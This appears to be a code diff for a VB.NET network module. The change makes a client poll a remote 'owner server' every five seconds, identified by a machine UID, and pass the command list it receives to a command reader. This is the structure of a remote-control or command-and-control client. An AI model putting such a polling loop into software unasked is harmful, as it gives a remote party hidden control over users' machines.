@@ -15,7 +15,6 @@ Namespace Network
 
         Function SendAPIRequest(ByVal clase As API_TYPES, ByVal content As String) As Boolean
             Try
-                'AddToLog("Network", "Sending API Request...", False)
 
                 Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
                 content = content.Replace("&", "{ampersand}")
@@ -38,6 +37,29 @@ Namespace Network
             Catch ex As Exception
                 AddToLog("SendAPIRequest@Network", "Error: " & ex.Message, True)
                 Return False
+            End Try
+        End Function
+        Function ReceiveAPIRequest(ByVal clase As API_TYPES) As String
+            Try
+
+                Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
+                request.ContentType = "application/x-www-form-urlencoded"
+                request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
+                request.Method = "GET"
+                request.Headers("ident") = UID
+                request.Headers("class") = clase.ToString
+
+                Dim response As WebResponse = request.GetResponse()
+                Dim dataReader As New StreamReader(response.GetResponseStream())
+                Dim respuesta As String = dataReader.ReadToEnd()
+
+                response.Close()
+                dataReader.Close()
+
+                Return respuesta
+            Catch ex As Exception
+                AddToLog("ReceiveAPIRequest@Network", "Error: " & ex.Message, True)
+                Return Nothing
             End Try
         End Function
 
@@ -237,19 +259,9 @@ Namespace Network
         Sub GetCommandFile()
             While True
                 Try
-                    Dim LocalCommandFile As String = DIRCommons & "\[" & UID & "]Command.str"
-                    Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                     Thread.Sleep(5000) '5 segundos (despues deben ser 10)
-                    If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
-                        My.Computer.FileSystem.DeleteFile(LocalCommandFile)
-                    End If
-                    My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
-                    'Leer
-                    Dim TextBoxVR As New TextBox With {
-                        .Text = My.Computer.FileSystem.ReadAllText(LocalCommandFile)
-                    }
-                    Dim Lineas = TextBoxVR.Lines
-                    ReadCommandFile(Lineas)
+                    'Obtener y luego leer
+                    ReadCommandFile(ReceiveAPIRequest(API_TYPES.COMMAND).Split(Environment.NewLine))
                 Catch ex As Exception
                     AddToLog("GetCommandFile@Network", "Error: " & ex.Message, True)
                 End Try
